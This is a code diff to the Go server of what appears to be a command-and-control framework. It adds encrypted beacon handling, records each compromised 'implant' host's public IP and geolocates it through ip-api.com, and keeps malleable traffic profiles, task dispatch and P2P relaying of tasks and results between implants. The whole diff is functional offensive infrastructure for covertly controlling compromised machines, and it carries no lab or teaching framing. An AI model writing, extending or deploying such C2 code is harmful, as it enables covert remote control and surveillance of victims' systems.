@@ -2,6 +2,7 @@ package server
 
 import (
 	"encoding/base64"
+	"encoding/json"
 	"fmt"
 	"log/slog"
 	"net/http"
@@ -68,18 +69,64 @@ type task struct {
 
 func (s *Server) handleBeacon(c *gin.Context) {
 	var req beaconRequest
-	if err := c.ShouldBindJSON(&req); err != nil {
-		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid json"})
-		return
+
+	if s.beaconCipher != nil {
+		raw, err := c.GetRawData()
+		if err != nil {
+			c.JSON(http.StatusBadRequest, gin.H{"error": "failed to read body"})
+			return
+		}
+		decrypted, err := s.beaconCipher.Decrypt(raw)
+		if err != nil {
+			c.JSON(http.StatusBadRequest, gin.H{"error": "decryption failed"})
+			return
+		}
+		if err := json.Unmarshal(decrypted, &req); err != nil {
+			c.JSON(http.StatusBadRequest, gin.H{"error": "invalid json after decryption"})
+			return
+		}
+	} else {
+		if err := c.ShouldBindJSON(&req); err != nil {
+			c.JSON(http.StatusBadRequest, gin.H{"error": "invalid json"})
+			return
+		}
 	}
 
 	if req.UUID == "" {
 		req.UUID = uuid.New().String()
 	}
 
-	resp := s.processBeacon(req)
+	publicIP := c.ClientIP()
 
-	if s.cfg.Malleable.Enabled {
+	resp := s.processBeacon(req, publicIP)
+
+	// Async GeoIP lookup (don't block beacon response)
+	if publicIP != "" && publicIP != "127.0.0.1" && publicIP != "::1" {
+		go func() {
+			country, city, lat, lon := s.lookupGeoIP(publicIP)
+			if country != "" {
+				var agent db.Implant
+				if err := s.db.Where("id = ?", req.UUID).First(&agent).Error; err == nil {
+					if agent.Country != country || agent.City != city {
+						s.db.Model(&agent).Updates(map[string]interface{}{
+							"country": country, "city": city,
+							"latitude": lat, "longitude": lon,
+						})
+					}
+				}
+			}
+		}()
+	}
+
+	if s.beaconCipher != nil {
+		respJSON, _ := json.Marshal(resp)
+		encrypted, err := s.beaconCipher.Encrypt(respJSON)
+		if err != nil {
+			c.JSON(http.StatusInternalServerError, gin.H{"error": "encryption failed"})
+			return
+		}
+		c.Data(http.StatusOK, "application/octet-stream", encrypted)
+	} else if s.cfg.Malleable.Enabled {
 		s.applyMalleableProfile(c, &resp)
 	} else {
 		c.JSON(http.StatusOK, resp)
@@ -88,7 +135,7 @@ func (s *Server) handleBeacon(c *gin.Context) {
 
 // processBeacon contains the core beacon logic (registration, result processing,
 // task dispatch). It is shared between HTTP and TCP transports.
-func (s *Server) processBeacon(req beaconRequest) beaconResponse {
+func (s *Server) processBeacon(req beaconRequest, publicIP string) beaconResponse {
 	now := time.Now()
 
 	// Helper to extract metadata from info map
@@ -102,7 +149,7 @@ func (s *Server) processBeacon(req beaconRequest) beaconResponse {
 		return 0
 	}
 
-	var agent db.Agent
+	var agent db.Implant
 	result := s.db.Where("id = ?", req.UUID).First(&agent)
 
 	if result.Error == gorm.ErrRecordNotFound {
@@ -122,13 +169,14 @@ func (s *Server) processBeacon(req beaconRequest) beaconResponse {
 			}
 		}
 
-		agent = db.Agent{
+		agent = db.Implant{
 			ID:              req.UUID,
 			Hostname:        hostname,
 			Username:        username,
 			OS:              req.Info["os"],
 			Arch:            req.Info["arch"],
 			IP:              ip,
+			PublicIP:        publicIP,
 			LastSeen:        now,
 			Status:          "online",
 			Version:         req.Info["version"],
@@ -150,10 +198,15 @@ func (s *Server) processBeacon(req beaconRequest) beaconResponse {
 		go s.broadcastAgentNotification(agent)
 	} else {
 		agent.LastSeen = now
-		agent.Status = "online"
+		agent.Status = s.agentStatus(agent).Status
 		updates := map[string]interface{}{
 			"last_seen": now,
 			"status":    "online",
+		}
+		// Update public IP if changed
+		if publicIP != "" && publicIP != agent.PublicIP {
+			updates["public_ip"] = publicIP
+			agent.PublicIP = publicIP
 		}
 		// Update metadata fields if present
 		if v := req.Info["version"]; v != "" {
@@ -195,7 +248,11 @@ func (s *Server) processBeacon(req beaconRequest) beaconResponse {
 				updates["listener_id"] = uint(id)
 			}
 		}
-		s.db.Model(&agent).Updates(updates)
+		result := s.db.Model(&agent).Where("id = ?", agent.ID).Updates(updates)
+		if result.Error != nil {
+			slog.Error("Failed to update agent", "id", agent.ID, "error", result.Error)
+		}
+		slog.Info("Beacon processed", "agent", req.UUID, "last_seen", now, "rows_affected", result.RowsAffected, "public_ip", publicIP, "status", "online")
 	}
 
 	for _, r := range req.Results {
@@ -269,7 +326,7 @@ func (s *Server) processBeacon(req beaconRequest) beaconResponse {
 					}
 				}
 				if len(sleepUpdates) > 0 {
-					s.db.Model(&db.Agent{}).Where("id = ?", req.UUID).Updates(sleepUpdates)
+					s.db.Model(&db.Implant{}).Where("id = ?", req.UUID).Updates(sleepUpdates)
 				}
 			}
 
@@ -407,7 +464,7 @@ func (s *Server) processBeacon(req beaconRequest) beaconResponse {
 	// ── P2P Relayed Results Processing ─────────────────────────────────────
 	for _, rd := range req.Relayed {
 		// Verify the child belongs to this parent
-		var childAgent db.Agent
+		var childAgent db.Implant
 		if err := s.db.Where("id = ? AND parent_id = ?", rd.AgentID, req.UUID).First(&childAgent).Error; err != nil {
 			slog.Warn("P2P relay from non-child agent", "parent", req.UUID, "child", rd.AgentID, "error", err)
 			continue
@@ -471,7 +528,7 @@ func (s *Server) processBeacon(req beaconRequest) beaconResponse {
 	}
 
 	// ── P2P Relayed Tasks for Children ──────────────────────────────────────
-	var children []db.Agent
+	var children []db.Implant
 	s.db.Where("parent_id = ?", req.UUID).Find(&children)
 	for _, child := range children {
 		var childTasks []db.Task
@@ -564,4 +621,28 @@ func safeJoin(base, name string) string {
 		return ""
 	}
 	return target
+}
+
+// lookupGeoIP queries ip-api.com for geolocation data
+func (s *Server) lookupGeoIP(ip string) (country, city string, lat, lon float64) {
+	if ip == "" || ip == "127.0.0.1" || ip == "::1" || strings.HasPrefix(ip, "192.168.") || strings.HasPrefix(ip, "10.") || strings.HasPrefix(ip, "172.") {
+		return "", "", 0, 0
+	}
+	url := "http://ip-api.com/json/" + ip + "?fields=country,city,lat,lon"
+	client := &http.Client{Timeout: 5 * time.Second}
+	resp, err := client.Get(url)
+	if err != nil {
+		return "", "", 0, 0
+	}
+	defer resp.Body.Close()
+	var result struct {
+		Country string  `json:"country"`
+		City    string  `json:"city"`
+		Lat     float64 `json:"lat"`
+		Lon     float64 `json:"lon"`
+	}
+	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
+		return "", "", 0, 0
+	}
+	return result.Country, result.City, result.Lat, result.Lon
 }
